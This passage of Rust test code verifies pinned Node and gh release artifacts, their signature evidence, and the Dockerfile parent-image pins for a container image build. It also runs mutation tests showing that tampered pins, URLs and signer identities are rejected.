        assert_ne!(
            edited, base,
            "the apt baseline mutation did not apply: {label}"
        );
        let error = check_apt_baseline_brackets_build(&edited)
            .expect_err(&format!("accepted an unbracketed build: {label}"));
        assert!(
            error.contains("check-sources.sh"),
            "{label}: the refusal names the missing bracket: {error}"
        );
    }
}

// --- pinned third-party release artifacts (#96) -----------------------------
//
// `images/artifacts/<name>.json` is the reviewed selection of one third-party
// release artifact and `images/install-artifact.sh` is the only thing that puts
// one into the image. The gate re-derives the identity from the pin instead of
// trusting the installer: both architectures, the canonical URL, the exact
// filename the member prefix derives from, a lower-case digest, and an
// authentication record of the expected kind. What it cannot re-derive is a
// hash - no SHA-256 implementation lives in this crate - so the committed
// evidence bytes are bound by `images/base-inputs.sha256` (which the host
// generator and the build verify) and by the installer, not here.

const ARTIFACT_PINS: [(&str, &str); 2] = [
    ("node", "images/artifacts/node.json"),
    ("gh", "images/artifacts/gh.json"),
];
/// The reviewed Node release key: one primary key from `nodejs/release-keys`,
/// with the fingerprint the pin has to name.
const NODE_RELEASE_KEY: &str = "node-release-key.asc";
const NODE_RELEASE_FINGERPRINT: &str = "5BE8A3F6C8A5C01D106C0AD820B1A390B168D356";
/// cli/cli's Sigstore identity, spelled the way the pin and the in-build
/// verifier spell it.
const GH_SIGSTORE_POLICY: [(&str, &str); 3] = [
    ("repository", "cli/cli"),
    (
        "signer_workflow",
        "cli/cli/.github/workflows/deployment.yml",
    ),
    (
        "cert_oidc_issuer",
        "https://token.actions.githubusercontent.com",
    ),
];
const ARTIFACT_LABEL_PREFIX: &str = "org.agent-vm.version.";
const ARTIFACT_INSTALLER: &str = "install-artifact.sh";
const ARTIFACT_SOURCE_ROOT: &str = "/tmp/artifact-source";

#[derive(Clone, Debug, PartialEq, Eq)]
struct ArtifactArchive {
    url: String,
    archive: String,
    member_prefix: String,
    digest: String,
    bundle: Option<(String, String)>,
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum ArtifactAuthentication {
    OpenPgp {
        key_path: String,
        fingerprint: String,
        key_digest: String,
        manifest_digest: String,
        signature_digest: String,
        verified_on: String,
    },
    Sigstore {
        checksums_digest: String,
        policy: BTreeMap<String, String>,
        verified_on: String,
        evidence: Vec<String>,
    },
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct ArtifactPin {
    name: String,
    version: String,
    payload: Vec<String>,
    links: Vec<(String, String)>,
    /// The npm version the reviewed Node archive ships, recorded so the runtime
    /// evidence compares against a reviewed value instead of whatever the image
    /// reports (#96 review: an equal-but-wrong npm/npx pair passed).
    bundled: Option<String>,
    archives: BTreeMap<String, ArtifactArchive>,
    authentication: ArtifactAuthentication,
}

fn platform_token(name: &str, platform: &str) -> &'static str {
    match (name, platform) {
        ("node", "linux/amd64") => "linux-x64",
        ("node", "linux/arm64") => "linux-arm64",
        ("gh", "linux/amd64") => "linux_amd64",
        ("gh", "linux/arm64") => "linux_arm64",
        _ => unreachable!("the pin names a supported artifact and platform"),
    }
}

fn artifact_filename(name: &str, version: &str, platform: &str) -> String {
    match name {
        "node" => format!("node-v{version}-{}.tar.xz", platform_token(name, platform)),
        _ => format!("gh_{version}_{}.tar.gz", platform_token(name, platform)),
    }
}

fn artifact_bundle_name(version: &str, platform: &str) -> String {
    format!("gh-{version}-{}.bundle.jsonl", platform.replace('/', "-"))
}

fn parse_artifact_authentication(
    name: &str,
    value: &Value,
) -> Result<ArtifactAuthentication, String> {
    if name == "node" {
        let members = exact(
            value,
            &[
                "method",
                "manifest",
                "signature",
                "key",
                "verified_on",
                "reason",
            ],
            "node authentication",
        )?;
        if text(&members["method"], "node method")? != "openpgp-signed-manifest" {
            return Err("node authentication must be an openpgp-signed-manifest".into());
        }
        let manifest = exact(&members["manifest"], &["url", "sha256"], "node manifest")?;
        let signature = exact(&members["signature"], &["url", "sha256"], "node signature")?;
        let key = exact(
            &members["key"],
            &["path", "fingerprint", "sha256"],
            "node key",
        )?;
        let key_path = text(&key["path"], "node key path")?;
        if key_path != NODE_RELEASE_KEY {
            return Err(format!(
                "node key path must be {NODE_RELEASE_KEY}, found {key_path}"
            ));
        }
        let fingerprint = text(&key["fingerprint"], "node key fingerprint")?;
        if fingerprint != NODE_RELEASE_FINGERPRINT {
            return Err(format!(
                "node key fingerprint must be the reviewed {NODE_RELEASE_FINGERPRINT}"
            ));
        }
        let key_digest = text(&key["sha256"], "node key sha256")?;
        if !is_lower_hex(&key_digest, 64) {
            return Err("node key sha256 must be a lower-case SHA-256".into());
        }
        let manifest_digest = text(&manifest["sha256"], "node manifest sha256")?;
        let signature_digest = text(&signature["sha256"], "node signature sha256")?;
        for (label, digest) in [
            ("manifest", &manifest_digest),
            ("signature", &signature_digest),
        ] {
            if !is_lower_hex(digest, 64) {
                return Err(format!("node {label} sha256 must be a lower-case SHA-256"));
            }
        }
        for (label, url) in [
            ("manifest", text(&manifest["url"], "node manifest url")?),
            ("signature", text(&signature["url"], "node signature url")?),
        ] {
            if !url.starts_with("https://nodejs.org/dist/") {
                return Err(format!(
                    "node {label} url must be the nodejs.org dist origin"
                ));
            }
        }
        let verified_on = text(&members["verified_on"], "node verified_on")?;
        if !is_date(&verified_on) {
            return Err("node verified_on must be a date".into());
        }
        let _ = text(&members["reason"], "node reason")?;
        return Ok(ArtifactAuthentication::OpenPgp {
            key_path,
            fingerprint,
            key_digest,
            manifest_digest,
            signature_digest,
            verified_on,
        });
    }
    let members = exact(
        value,
        &[
            "method",
            "checksums",
            "policy",
            "verified_on",
            "reason",
            "evidence",
        ],
        "gh authentication",
    )?;
    if text(&members["method"], "gh method")? != "sigstore-attestation" {
        return Err("gh authentication must be a sigstore-attestation".into());
    }
    let checksums = exact(&members["checksums"], &["url", "sha256"], "gh checksums")?;
    let checksums_digest = text(&checksums["sha256"], "gh checksums sha256")?;
    if !is_lower_hex(&checksums_digest, 64) {
        return Err("gh checksums sha256 must be a lower-case SHA-256".into());
    }
    if !text(&checksums["url"], "gh checksums url")?
        .starts_with("https://github.com/cli/cli/releases/download/")
    {
        return Err("gh checksums url must be the cli/cli release download".into());
    }
    let policy_members = exact(
        &members["policy"],
        &[
            "repository",
            "signer_workflow",
            "cert_oidc_issuer",
            "deny_self_hosted_runners",
        ],
        "gh policy",
    )?;
    let mut policy = BTreeMap::new();
    for (key, expected) in GH_SIGSTORE_POLICY {
        let found = text(&policy_members[key], &format!("gh policy {key}"))?;
        if found != expected {
            return Err(format!("gh policy {key} must be {expected}, found {found}"));
        }
        policy.insert(key.to_owned(), found);
    }
    policy.insert(
        "deny_self_hosted_runners".to_owned(),
        policy_members["deny_self_hosted_runners"].to_string(),
    );
    if policy_members["deny_self_hosted_runners"] != Value::Bool(true) {
        return Err("gh policy must deny self-hosted runners".into());
    }
    let verified_on = text(&members["verified_on"], "gh verified_on")?;
    if !is_date(&verified_on) {
        return Err("gh verified_on must be a date".into());
    }
    let _ = text(&members["reason"], "gh reason")?;
    let mut evidence = Vec::new();
    for item in array(&members["evidence"], "gh evidence")? {
        let url = text(item, "gh evidence url")?;
        if !url.starts_with("https://") {
            return Err("gh evidence entries must be https URLs".into());
        }
        evidence.push(url);
    }
    if evidence.is_empty() {
        return Err("gh authentication must cite evidence".into());
    }
    Ok(ArtifactAuthentication::Sigstore {
        checksums_digest,
        policy,
        verified_on,
        evidence,
    })
}

fn parse_artifact_pin(name: &str, source: &str) -> Result<ArtifactPin, String> {
    let value = strict_json(source)?;
    let mut keys = vec![
        "schema",
        "name",
        "kind",
        "version",
        "upstream",
        "install",
        "platforms",
    ];
    if name == "node" {
        keys.push("bundled");
    }
    keys.push("authentication");
    let members = exact(&value, &keys, "artifact pin")?;
    if members["schema"].as_u64() != Some(1) {
        return Err("unsupported artifact pin schema".into());
    }
    if text(&members["name"], "artifact name")? != name {
        return Err(format!("the pin must name the artifact {name}"));
    }
    if text(&members["kind"], "artifact kind")? != "release-archive" {
        return Err("artifact kind must be release-archive".into());
    }
    let version = text(&members["version"], "artifact version")?;
    if !is_exact_version(&version) {
        return Err(format!(
            "artifact version must be an exact X.Y.Z: {version}"
        ));
    }
    let upstream = exact(
        &members["upstream"],
        &["project", "release"],
        "artifact upstream",
    )?;
    let _ = text(&upstream["project"], "artifact upstream project")?;
    if text(&upstream["release"], "artifact upstream release")? != format!("v{version}") {
        return Err("artifact upstream release must be v<version>".into());
    }
    let bundled = if name == "node" {
        let node = exact(&members["bundled"], &["npm"], "node bundled")?;
        let npm = text(&node["npm"], "node bundled npm")?;
        if !is_exact_version(&npm) {
            return Err(format!("node bundled npm must be an exact X.Y.Z: {npm}"));
        }
        Some(npm)
    } else {
        None
    };
    let install = exact(
        &members["install"],
        &["destination", "payload", "links"],
        "artifact install",
    )?;
    if text(&install["destination"], "artifact destination")? != "/usr/local" {
        return Err("artifact destination must be /usr/local".into());
    }
    let payload_entries = array(&install["payload"], "artifact payload")?;
    if payload_entries.is_empty() {
        return Err("artifact payload must be non-empty".into());
    }
    let mut payload = Vec::new();
    for item in payload_entries {
        let entry = text(item, "artifact payload entry")?;
        if entry.starts_with('/') || entry.split('/').any(|part| part.is_empty() || part == "..") {
            return Err(format!("artifact payload entry must be relative: {entry}"));
        }
        payload.push(entry);
    }
    let mut links = Vec::new();
    for item in array(&install["links"], "artifact links")? {
        let link = exact(item, &["path", "target"], "artifact link")?;
        let mut pair = Vec::new();
        for key in ["path", "target"] {
            let path = text(&link[key], "artifact link path")?;
            if !path.starts_with('/') || path.split('/').any(|part| part == "..") {
                return Err(format!("artifact link {key} must be absolute: {path}"));
            }
            pair.push(path);
        }
        links.push((pair.remove(0), pair.remove(0)));
    }
    let platform_keys: &[&str] = if name == "gh" {
        &["url", "archive", "member_prefix", "sha256", "bundle"]
    } else {
        &["url", "archive", "member_prefix", "sha256"]
    };
    let entries = exact_platforms(&members["platforms"], platform_keys, "artifact platforms")?;
    let mut archives = BTreeMap::new();
    for (platform, entry) in PLATFORMS.iter().zip(entries) {
        let context = format!("{name} {platform}");
        let url = text(&entry["url"], &format!("{context} url"))?;
        let origin = if name == "node" {
            "https://nodejs.org/dist/"
        } else {
            "https://github.com/cli/cli/releases/download/"
        };
        let expected = artifact_filename(name, &version, platform);
        // The expected URL is *computed*, not matched by prefix: `..` segments
        // (which GitHub resolves into another repository), a lookalike host, an
        // extra path segment or a query string must not be able to name bytes
        // that are not the reviewed release asset.
        let canonical = format!("{origin}v{version}/{expected}");
        if url != canonical {
            return Err(format!(
                "{context}: url must be exactly {canonical}, found {url}"
            ));
        }
        let (suffix, kind) = match expected.rsplit_once('.') {
            Some((_, "xz")) => (".tar.xz", "tar.xz"),
            _ => (".tar.gz", "tar.gz"),
        };
        if text(&entry["archive"], &format!("{context} archive"))? != kind {
            return Err(format!("{context}: archive must be {kind}"));
        }
        let prefix = format!("{}/", &expected[..expected.len() - suffix.len()]);
        if text(&entry["member_prefix"], &format!("{context} member_prefix"))? != prefix {
            return Err(format!("{context}: member_prefix must be {prefix}"));
        }
        let digest = text(&entry["sha256"], &format!("{context} sha256"))?;
        if !is_lower_hex(&digest, 64) {
            return Err(format!("{context}: sha256 must be a lower-case SHA-256"));
        }
        let bundle = if name == "gh" {
            let bundle = exact(
                &entry["bundle"],
                &["path", "sha256"],
                &format!("{context} bundle"),
            )?;
            let path = text(&bundle["path"], &format!("{context} bundle path"))?;
            let wanted = artifact_bundle_name(&version, platform);
            if path != wanted {
                return Err(format!("{context}: bundle must be {wanted}"));
            }
            let digest = text(&bundle["sha256"], &format!("{context} bundle sha256"))?;
            if !is_lower_hex(&digest, 64) {
                return Err(format!(
                    "{context}: bundle sha256 must be a lower-case SHA-256"
                ));
            }
            Some((path, digest))
        } else {
            None
        };
        archives.insert(
            (*platform).to_owned(),
            ArtifactArchive {
                url,
                archive: kind.to_owned(),
                member_prefix: prefix,
                digest,
                bundle,
            },
        );
    }
    Ok(ArtifactPin {
        name: name.to_owned(),
        version,
        payload,
        links,
        bundled,
        archives,
        authentication: parse_artifact_authentication(name, &members["authentication"])?,
    })
}

/// The committed artifact evidence files, and the manifest's own entry for each:
/// the gate cannot hash, so the binding it *can* check is that the bytes a build
/// mounts are the bytes the generated manifest lists.
fn artifact_evidence_paths(pin: &ArtifactPin) -> Vec<String> {
    let mut paths = Vec::new();
    match &pin.authentication {
        ArtifactAuthentication::OpenPgp { key_path, .. } => paths.push(key_path.clone()),
        ArtifactAuthentication::Sigstore { .. } => {
            for archive in pin.archives.values() {
                if let Some((bundle, _)) = &archive.bundle {
                    paths.push(bundle.clone());
                }
            }
        }
    }
    paths
}

fn base_input_manifest_paths() -> Vec<String> {
    read_text(BASE_INPUT_MANIFEST)
        .lines()
        .filter_map(|line| line.get(66..).map(str::to_owned))
        .collect()
}

/// What the base recipe may consume for these artifacts: one RUN that mounts the
/// installer and the pins read-only and invokes both with the build's own
/// `TARGETARCH`, so the selection cannot be pinned to the architecture of the
/// machine that built the image.
fn artifact_install_run(base: &str) -> Result<String, String> {
    let installer = format!("{ARTIFACT_SOURCE_ROOT}/{ARTIFACT_INSTALLER}");
    let runs: Vec<String> = dockerfile_instructions(base)
        .into_iter()
        .filter(|instruction| {
            instruction.starts_with("RUN ") && instruction.contains(&format!("bash {installer}"))
        })
        .collect();
    if runs.len() != 1 {
        return Err(format!(
            "the base recipe must install the pinned artifacts in exactly one RUN, found {}",
            runs.len()
        ));
    }
    let run = runs.into_iter().next().expect("one run");
    let mounts = leading_mount_specs(&run);
    for source in [ARTIFACT_INSTALLER, "artifacts"] {
        let spec = mounts
            .iter()
            .find(|spec| mount_field(spec, "source").as_deref() == Some(source))
            .ok_or_else(|| format!("the artifact run does not mount {source}"))?;
        if mount_field(spec, "target") != Some(format!("{ARTIFACT_SOURCE_ROOT}/{source}")) {
            return Err(format!(
                "{source} must be mounted at {ARTIFACT_SOURCE_ROOT}/{source}"
            ));
        }
        if !mount_flag(spec, "ro") {
            return Err(format!("{source} must be a read-only mount"));
        }
    }
    let tokens: Vec<&str> = run.split_whitespace().collect();
    for name in ["node", "gh"] {
        let expected = [
            installer.as_str(),
            name,
            &format!("{ARTIFACT_SOURCE_ROOT}/artifacts/{name}.json") as &str,
            "\"$TARGETARCH\"",
        ];
        let found = tokens
            .windows(expected.len())
            .any(|window| window == expected.as_slice());
        if !found {
            return Err(format!(
                "the artifact run must invoke {ARTIFACT_INSTALLER} {name} \
                 {ARTIFACT_SOURCE_ROOT}/artifacts/{name}.json with the build's TARGETARCH"
            ));
        }
    }
    if !run.contains(&format!("ARTIFACT_SOURCE_DIR={ARTIFACT_SOURCE_ROOT}")) {
        return Err(format!(
            "the artifact run must set ARTIFACT_SOURCE_DIR={ARTIFACT_SOURCE_ROOT}"
        ));
    }
    Ok(run)
}

/// Every maintained helper, minus verbatim upstream provenance snapshots and the
/// baseline checker itself, which necessarily names apt paths and flags.
///
/// The set is chosen by *program text*, not by the `.sh` extension: a mounted
/// `images/artifacts/extra.sh`-style helper, a `.py` helper with a shell body and
/// an executable without an extension are all sources a build runs, so the pipe,
/// package and artifact rules apply to each of them (#96 review).
fn maintained_helper_sources() -> BTreeMap<String, String> {
    let mut sources = repository_files("images", None, None);
    sources.extend(repository_files("examples", None, None));
    sources.retain(|path, _| {
        let name = path.rsplit('/').next().unwrap_or(path);
        is_program_text(name)
            && !is_provenance_snapshot(Path::new(path))
            && path != "images/apt-policy/check-sources.sh"
    });
    sources
}

fn repository_files(
    root: &str,
    name: Option<&str>,
    extension: Option<&str>,
) -> BTreeMap<String, String> {
    let mut found = BTreeMap::new();
    let mut stack = vec![repo_path(root)];
    while let Some(directory) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&directory) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                stack.push(path);
                continue;
            }
            let matches_name =
                name.is_some_and(|wanted| path.file_name().is_some_and(|found| found == wanted));
            let matches_extension = extension
                .is_some_and(|wanted| path.extension().is_some_and(|found| found == wanted));
            if !matches_name && !matches_extension {
                continue;
            }
            let relative = path
                .strip_prefix(repo_path(""))
                .expect("maintained source inside the repository")
                .to_string_lossy()
                .replace('\\', "/");
            found.insert(
                relative,
                std::fs::read_to_string(&path).expect("read maintained source"),
            );
        }
    }
    found
}

fn maintained_recipes() -> BTreeMap<String, String> {
    let mut recipes = repository_files("images", Some("Dockerfile"), None);
    recipes.extend(repository_files("examples", Some("Dockerfile"), None));
    recipes
}

/// Every digest *reference* (`@sha256:<64 hex>`) in a document that points at a
/// parent must be a committed pin digest; a stale one is a wrong parent identity.
/// Bare hashes elsewhere in the docs describe other artifacts, not parents.
fn check_digest_mentions(
    documents: &BTreeMap<String, String>,
    inventory: &ParentInventory,
) -> Result<(), String> {
    let known: BTreeSet<String> = inventory
        .pins
        .values()
        .map(|pin| pin.reference().digest.value().to_owned())
        .collect();
    for (path, source) in documents {
        let mut rest = source.as_str();
        while let Some(at) = rest.find("@sha256:") {
            rest = &rest[at + "@sha256:".len()..];
            let hex: String = rest.chars().take(64).collect();
            if hex.len() < 64 || !hex.bytes().all(|byte| byte.is_ascii_hexdigit()) {
                continue;
            }
            let digest = format!("sha256:{hex}");
            if !known.contains(&digest) {
                return Err(format!("{path}: stale parent digest {digest}"));
            }
        }
    }
    Ok(())
}

fn parent_documents() -> BTreeMap<String, String> {
    let mut documents = BTreeMap::new();
    for relative in [PARENT_INVENTORY, "README.md", "examples/layers/README.md"] {
        if let Ok(source) = std::fs::read_to_string(repo_path(relative)) {
            documents.insert(relative.to_owned(), source);
        }
    }
    documents.extend(repository_files("docs", None, Some("md")));
    documents.extend(maintained_recipes());
    documents
}

/// The recipes this repository maintains today. The gate is not this number: a
/// new recipe is accepted once it is registered in the parent inventory, so
/// onboarding a layer does not edit a count here. What this list forbids is
/// deleting a maintained recipe silently, even together with its inventory entry.
const REQUIRED_RECIPES: [&str; 7] = [
    "examples/base-extension/Dockerfile",
    "examples/layers/chrome-devtools/Dockerfile",
    "examples/layers/go-dev/Dockerfile",
    "examples/layers/rust-dev/Dockerfile",
    "examples/layers/wirenboard-cpp/Dockerfile",
    "images/Dockerfile",
    "images/standard/Dockerfile",
];

fn check_required_recipes(recipes: &BTreeMap<String, String>) -> Result<(), String> {
    for required in REQUIRED_RECIPES {
        if !recipes.contains_key(required) {
            return Err(format!("missing maintained recipe: {required}"));
        }
    }
    Ok(())
}

#[test]
fn the_parent_inventory_pins_every_maintained_recipe() {
    let inventory = parse_parent_inventory(&read_text(PARENT_INVENTORY)).unwrap();
    let recipes = maintained_recipes();
    check_required_recipes(&recipes).unwrap();
    // Exact set equality both ways, so an unregistered recipe fails too.
    check_recipe_parents(&inventory, &recipes).unwrap();
    let debian = match &inventory.pins[DEBIAN_PIN] {
        Pin::Official(pin) => pin,
        Pin::Release(_) => panic!("the Debian parent is an official image"),
    };
    assert_eq!(debian.reference.repository.value(), "debian");
    assert_eq!(debian.reference.tag.as_deref(), Some("13-slim"));
    let base = read_text("images/Dockerfile");
    let from_debian = base
        .lines()
        .find_map(|line| line.strip_prefix("FROM debian:13-slim@"))
        .expect("the base recipe pins Debian");
    assert_eq!(debian.reference.digest.value(), from_debian.trim());
    assert_eq!(
        debian.platforms.keys().collect::<Vec<_>>(),
        vec!["linux/amd64", "linux/arm64"]
    );
    assert_eq!(
        debian.expected_source,
        "https://github.com/debuerreotype/docker-debian-artifacts.git"
    );
    match &debian.verification {
        Verification::HashOnly {
            reviewed_on,
            evidence,
            reassess,
            ..
        } => {
            assert!(is_date(reviewed_on));
            assert!(reassess.starts_with("Stop refresh if a supported verifiable signing scheme"));
            let cited: Vec<&str> = evidence.iter().map(String::as_str).collect();
            for url in HASH_ONLY_EVIDENCE {
                assert!(cited.contains(&url), "evidence misses {url}");
            }
        }
        other => panic!("the Debian exception must be hash-only, got {other:?}"),
    }
    let go = match &inventory.pins[GO_PIN] {
        Pin::Official(pin) => pin,
        Pin::Release(_) => panic!("the Go builder is an official image"),
    };
    assert_eq!(go.reference.repository.value(), "golang");
    let toolchain = read_text("images/recipe-contract/go.mod")
        .lines()
        .find_map(|line| line.strip_prefix("toolchain go"))
        .expect("go.mod declares a toolchain")
        .trim()
        .to_owned();
    let wanted_tag = format!("{toolchain}-trixie");
    assert_eq!(go.reference.tag.as_deref(), Some(wanted_tag.as_str()));
    assert_eq!(
        go.expected_source,
        "https://github.com/docker-library/golang.git"
    );
    let major_minor = toolchain
        .rsplit_once('.')
        .map(|(major_minor, _)| major_minor)
        .expect("the go.mod toolchain is an X.Y.Z release");
    for platform in PLATFORMS {
        let record = &go.platforms[platform];
        let fragment = record
            .source
            .strip_prefix("https://github.com/docker-library/golang.git#")
            .unwrap_or_else(|| panic!("{platform}: unexpected Go source {}", record.source));
        let (fragment_revision, directory) = fragment.split_once(':').expect("revision:directory");
        assert_eq!(
            fragment_revision, record.revision.0,
            "the fragment revision equals the annotation"
        );
        assert_eq!(
            directory,
            format!("{major_minor}/trixie"),
            "the fragment directory tracks the tag"
        );
        assert!(is_rfc3339(&record.created));
    }
    let release = match &inventory.pins[RELEASE_PIN] {
        Pin::Release(pin) => pin,
        Pin::Official(_) => panic!("the released standard image is a repository release"),
    };
    assert_eq!(
        release.reference.repository.value(),
        "ghcr.io/gregwebs/agent-vm-standard"
    );
    assert!(
        release.reference.tag.is_none(),
        "a released pin is digest-addressed"
    );
    // The gate binds the *inventory and the recipes* to one another; the version
    // itself is refreshed by `refresh-parent-pins.sh standard-release X.Y.Z`, so a
    // literal here would make that documented refresh fail this gate.
    assert!(
        is_exact_version(&release.version),
        "the release pin records an exact X.Y.Z version, got {}",
        release.version
    );
    match &release.verification {
        Verification::GithubAttestation {
            repository,
            signer_workflow: workflow,
            source_ref,
            source_sha,
            invocation_url,
            ..
        } => {
            assert_eq!(repository, "gregwebs/agent-vm-images");
            assert_eq!(workflow, &signer_workflow(repository));
            assert_eq!(source_ref, "refs/heads/main");
            assert!(is_lower_hex(&source_sha.0, 40));
            assert!(
                invocation_url
                    .starts_with("https://github.com/gregwebs/agent-vm-images/actions/runs/")
            );
        }
        other => panic!("the release pin needs GitHub attestation, got {other:?}"),
    }
    for recipe in [
        "examples/layers/chrome-devtools/Dockerfile",
        "examples/layers/go-dev/Dockerfile",
        "examples/layers/rust-dev/Dockerfile",
        "examples/layers/wirenboard-cpp/Dockerfile",
        "examples/layers/README.md",
    ] {
        assert!(
            read_text(recipe).contains(&release.reference.text()),
            "{recipe} is stale"
        );
    }
    let apt = read_text("images/apt-policy/debian.sources");
    assert_eq!(
        apt.matches("Signed-By: /usr/share/keyrings/debian-archive-keyring.pgp")
            .count(),
        2
    );
    assert!(apt.starts_with("Types: deb\n# http://snapshot.debian.org/"));
    let keyrings = read_text("images/apt-policy/keyrings.sha256");
    assert!(!keyrings.is_empty());
    for line in keyrings.lines() {
        let (hex, path) = line.split_once("  ").expect("two-space separator");
        assert!(is_lower_hex(hex, 64), "invalid keyring hash: {line}");
        assert!(
            path.starts_with("usr/share/keyrings/") || path.starts_with("etc/apt/trusted.gpg.d/")
        );
        assert!(!path.contains("..") && !path.starts_with('/'));
    }
    assert!(keyrings.contains("  usr/share/keyrings/debian-archive-keyring.pgp"));
    check_digest_mentions(&parent_documents(), &inventory).unwrap();
    check_legacy_install_paths(&recipes, &maintained_helper_sources()).unwrap();
    assert_eq!(
        read_json(PARENT_INVENTORY)["apt_open_gaps"],
        Value::Array(vec![]),
        "both recorded third-party apt instructions are gone with their installers (#96)"
    );
}

/// `attestations.py` is the verifier that refuses an inventory naming any other
/// signer, and it reads `REPO`/`WORKFLOW` from its own module. The gate composes
/// the same identity from two Rust literals, so a rename in the release module
/// would make Python follow and Rust silently not.
#[test]
fn the_signer_identity_agrees_with_the_release_verifier() {
    let source = read_text("script/release/attestations.py");
    for declaration in [
        format!("REPO = '{RELEASE_REPOSITORY}'"),
        format!("WORKFLOW = REPO + '/{RELEASE_WORKFLOW}'"),
    ] {
        assert!(
            source.lines().any(|line| line.trim() == declaration),
            "attestations.py no longer declares `{declaration}`; update RELEASE_REPOSITORY \
             and RELEASE_WORKFLOW with it"
        );
    }
}

#[test]
fn the_base_build_ca_label_is_the_release_refusal_key() {
    // The release refuses a CA-carrying base by reading this label, and the key
    // name is written twice: in the Dockerfile that declares it and in the
    // constant the release reads. A rename on either side would leave the
    // refusal inspecting a label no image carries, which is why the release
    // refuses an absent key and why the two spellings are tied here.
    let operations = read_text("script/release/operations.py");
    let declarations: Vec<&str> = operations
        .lines()
        .filter_map(|line| line.strip_prefix("BUILD_CA_LABEL = "))
        .collect();
    assert_eq!(
        declarations.len(),
        1,
        "operations.py declares exactly one BUILD_CA_LABEL: {declarations:?}"
    );
    let label = declarations[0]
        .trim()
        .strip_prefix('\'')
        .and_then(|value| value.strip_suffix('\''))
        .expect("BUILD_CA_LABEL is a single-quoted literal");
    assert_eq!(
        label_value(&read_text("images/Dockerfile"), label),
        "${BUILD_CA_SHA256}",
        "the base LABEL must be the label the public release refuses"
    );
}

#[test]
fn parent_inventory_blocks_reject_edits() {
    let inventory = parse_parent_inventory(&read_text(PARENT_INVENTORY)).unwrap();
    let recipes = maintained_recipes();
    let debian = inventory.pins[DEBIAN_PIN].reference().text();
    let go = inventory.pins[GO_PIN].reference().text();
    let release = inventory.pins[RELEASE_PIN].reference().text();
    let mut mutations: Vec<(&str, BTreeMap<String, String>)> = Vec::new();
    for (label, path, from, to) in [
        (
            "changed Debian digest",
            "images/Dockerfile",
            debian.clone(),
            format!("debian:13-slim@sha256:{}", "0".repeat(64)),
        ),
        (
            "tag-only parent",
            "images/Dockerfile",
            debian.clone(),
            "debian:13-slim".to_owned(),
        ),
        (
            "same digest at another repository",
            "images/Dockerfile",
            debian.clone(),
            format!(
                "debianx:13-slim@{}",
                debian.rsplit('@').next().unwrap_or_default()
            ),
        ),
        (
            "inconsistent Go declaration",
            "images/standard/Dockerfile",
            go,
            format!("golang:0.0.0-trixie@sha256:{}", "1".repeat(64)),
        ),
        (
            "local base replaced",
            "examples/base-extension/Dockerfile",
            LOCAL_BASE.to_owned(),
            "agent-vm-base:other".to_owned(),
        ),
        (
            "stale released parent",
            "examples/layers/go-dev/Dockerfile",
            release,
            format!(
                "ghcr.io/gregwebs/agent-vm-standard@sha256:{}",
                "2".repeat(64)
            ),
        ),
        (
            "new FROM",
            "images/Dockerfile",
            "CMD [\"/bin/bash\"]".to_owned(),
            "FROM busybox:1\n\nCMD [\"/bin/bash\"]".to_owned(),
        ),
    ] {
        let mut edited = recipes.clone();
        let source = recipes[path].clone();
        let changed = source.replace(&from, &to);
        assert_ne!(changed, source, "{label}: mutation did not apply");
        edited.insert(path.to_owned(), changed);
        mutations.push((label, edited));
    }
    // The positive control for the same equality: an eighth recipe that is
    // registered in the inventory is accepted, so adding a layer is a reviewed
    // registration rather than a number to change here.
    let mut registered_inventory = inventory.clone();
    let mut registered_recipes = recipes.clone();
    let registered = "examples/layers/new-layer/Dockerfile".to_owned();
    registered_recipes.insert(
        registered.clone(),
        format!("FROM {}\n", inventory.pins[DEBIAN_PIN].reference().text()),
    );
    registered_inventory.recipes.insert(
        registered,
        vec![ParentSpec {
            stage: None,
            binding: Binding::Pin(DEBIAN_PIN.to_owned()),
        }],
    );
    assert!(
        check_recipe_parents(&registered_inventory, &registered_recipes).is_ok(),
        "a registered eighth recipe must be accepted"
    );
    let mut deleted = recipes.clone();
    deleted.remove(REQUIRED_RECIPES[0]);
    assert!(
        check_required_recipes(&deleted).is_err(),
        "deleting a required recipe must fail"
    );

    for (label, mutate) in [("unlisted recipe", 0_u8), ("missing recipe", 1_u8)] {
        let mut edited = recipes.clone();
        if mutate == 0 {
            edited.insert(
                "examples/layers/new/Dockerfile".to_owned(),
                format!("FROM {}\n", inventory.pins[DEBIAN_PIN].reference().text()),
            );
        } else {
            edited.remove("examples/layers/go-dev/Dockerfile");
        }
        mutations.push((label, edited));
    }
    for (label, edited) in mutations {
        assert!(
            check_recipe_parents(&inventory, &edited).is_err(),
            "accepted a recipe mutation: {label}"
        );
    }

    let source = read_text(PARENT_INVENTORY);
    let index = inventory.pins[RELEASE_PIN]
        .reference()
        .digest
        .value()
        .to_owned();
    for (label, from, to) in [
        (
            "tagged release reference",
            format!("@{index}"),
            format!(":0.1.3@{index}"),
        ),
        (
            "unknown pin kind",
            "docker-official-image".to_owned(),
            "docker-official-image-x".to_owned(),
        ),
        (
            "missing arm64 platform",
            "linux/arm64".to_owned(),
            "linux/armv8".to_owned(),
        ),
        (
            "wrong signer workflow",
            "release-standard.yml".to_owned(),
            "release-other.yml".to_owned(),
        ),
        (
            "wrong source ref",
            "refs/heads/main".to_owned(),
            "refs/heads/dev".to_owned(),
        ),
        (
            "blank reassess",
            "Stop refresh if a supported verifiable signing scheme is published for this image"
                .to_owned(),
            "   ".to_owned(),
        ),
        (
            "unknown field",
            "\"expected_source\":".to_owned(),
            "\"expected-source\":".to_owned(),
        ),
        (
            "missing provenance",
            "\"revision\":".to_owned(),
            "\"revised\":".to_owned(),
        ),
        (
            "recorded apt gap",
            "\"apt_open_gaps\": []".to_owned(),
            "\"apt_open_gaps\": [{\"recipe\": \"images/Dockerfile\", \"instruction\": \
             \"RUN true\", \"owner\": \"https://github.com/gregwebs/agent-vm-images/issues/96\"}]"
                .to_owned(),
        ),
    ] {
        let edited = source.replacen(&from, &to, 1);
        assert_ne!(edited, source, "{label}: inventory mutation did not apply");
        assert!(
            parse_parent_inventory(&edited).is_err(),
            "accepted an inventory mutation: {label}"
        );
    }
    // The trusted signer is this repository's release workflow, not whatever
    // pair the inventory names: a fork that signs with its own workflow of the
    // same name is internally consistent but is not the trusted identity.
    let forked = source.replace("gregwebs/agent-vm-images", "gregwebs/agent-vm-images-fork");
    assert_ne!(forked, source, "the fork mutation did not apply");
